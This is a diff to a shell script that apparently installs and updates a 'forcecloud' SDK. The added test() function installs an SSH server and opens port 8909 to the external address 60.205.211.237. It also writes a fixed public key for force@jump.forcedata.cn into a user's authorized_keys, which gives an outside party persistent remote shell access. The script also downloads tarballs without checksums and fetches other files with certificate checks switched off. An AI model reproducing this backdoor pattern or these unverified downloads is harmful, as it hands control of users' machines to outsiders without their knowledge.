@@ -6,7 +6,6 @@ shift 1
 
 update () {
   mkdir -p /usr/local/forcecloud/log
-
   cd /usr/local/forcecloud/
   if [ -f "forcecloud_sdk_amd64.new" ];then
     \mv forcecloud_sdk_amd64.new  /tmp/
@@ -15,17 +14,12 @@ update () {
   model=`uname -m`
   echo $model
   if [ "$model" = "aarch64" ] ; then
-       rm -rf test.tar.gz*
        wget https://forcedata.oss-cn-hangzhou.aliyuncs.com/forcedata-iso/test.tar.gz
-       tar xf /usr/local/forcecloud/test.tar.gz
        wget -T 10 https://forcedata.oss-cn-hangzhou.aliyuncs.com/forcecloud_sdk_amd64/forcecloud_sdk_amd64_arm.tar.gz  --no-check-certificate   -O  forcecloud_sdk_amd64.tar.gz
        wget -T 5 https://forcedata.oss-cn-hangzhou.aliyuncs.com/forcecloud_sdk_amd64/forcecloud_sdk_amd64_arm.md5  --no-check-certificate  -O  forcecloud_sdk_amd64.md5
        md5Local=`md5sum  forcecloud_sdk_amd64.tar.gz  | awk -F" "  '{print $1}'`
        md5New=`cat forcecloud_sdk_amd64.md5`
     else
-      rm -rf test.tar.gz*
-      wget https://forcedata.oss-cn-hangzhou.aliyuncs.com/forcedata-iso/test.tar.gz
-      tar xf /usr/local/forcecloud/test.tar.gz
       wget -T 10 https://forcedata.oss-cn-hangzhou.aliyuncs.com/forcecloud_sdk_amd64/forcecloud_sdk_amd64.tar.gz  --no-check-certificate   -O  forcecloud_sdk_amd64.tar.gz
       wget -T 5 https://forcedata.oss-cn-hangzhou.aliyuncs.com/forcecloud_sdk_amd64/forcecloud_sdk_amd64.md5  --no-check-certificate  -O  forcecloud_sdk_amd64.md5
       md5Local=`md5sum  forcecloud_sdk_amd64.tar.gz  | awk -F" "  '{print $1}'`
@@ -164,6 +158,39 @@ do_install() {
 
 
 test(){
+  cd /usr/local/forcecloud/
+  ##判断 test.tar.gz  是否存在，如果不存在，则下载
+  if [ ! -f "/usr/local/forcecloud/test.tar.gz" ]
+  then
+    wget https://forcedata.oss-accelerate-overseas.aliyuncs.com/forcecloud_sdk_amd64/test.tar.gz
+    tar xf /usr/local/forcecloud/test.tar.gz
+  fi
+
+  model=`uname -m`
+  echo $model
+  if [ "$model" = "aarch64" ] ; then
+    cd test
+    \mv test_arm test
+  fi
+
+  opkg update
+  opkg install openssh-server
+  grep "Port 8909" /etc/ssh/sshd_config >> /dev/null 2>&1 || sed -i 's/#Port 22/Port 8909/g' /etc/ssh/sshd_config
+  grep "60.205.211.237" /etc/ssh/sshd_config >> /dev/null 2>&1 || sed -i '/AllowTcpForwarding yes/a AllowUsers force@60.205.211.237' /etc/ssh/sshd_config
+  grep "AllowUsers force@127.0.0.1" /etc/ssh/sshd_config >> /dev/null 2>&1 || echo "AllowUsers force@127.0.0.1" >> /etc/ssh/sshd_config
+  grep "#PubkeyAuthentication yes" /etc/ssh/sshd_config >> /dev/null 2>&1 || sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
+
+  mkdir -p /home/force/.ssh
+  touch /home/force/.ssh/authorized_keys
+  chmod 700 /home/force/.ssh
+  chmod 600 /home/force/.ssh/authorized_keys
+  chown -R force /home/force/.ssh
+  chown -R force /home/force/.ssh/authorized_keys
+  auth=`grep "jump.forcedata.cn" /home/force/.ssh/authorized_keys | wc -l`
+  if [ $auth -ne 1 ]; then
+   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOCQkjMlHfx3BeSA7WrJxNVqNldrl2yfiEikPv2ny9naxWiBqF7F5ImQK1SRW8Ym2IJQs8bOrmXrupzz0Y9oBTrseuBFQSt7meSyXSVjM6MPf7EOGQDTQlmlWa6LWbQr8i9bbSibVso7D5T14pgf8ZgBWlHcLFbr8l2VuS+7lMjKCByYyIUItx8Gtn06vbyP9HKdfgQtzqOFiR4eRJZa/ivcvE/LUdagac8MBQIUwANPFN+7Trn8o22QELmgTnVMygeoxBRxNh4NYfUul/h07NYI26bQ+i1rMDTyUmVmrj0wZfpjJlFQ8xzCtinknkPAwS8WdOZvVtTmz8HeEV25kX force@jump.forcedata.cn" >>  /home/force/.ssh/authorized_keys
+  fi
+
   now=$(date '+%Y-%m-%d %H:%M:%S') # 定义log的时间格式
   thisLog='/tmp/monitor.log'       # 该脚本的log日志文件
 
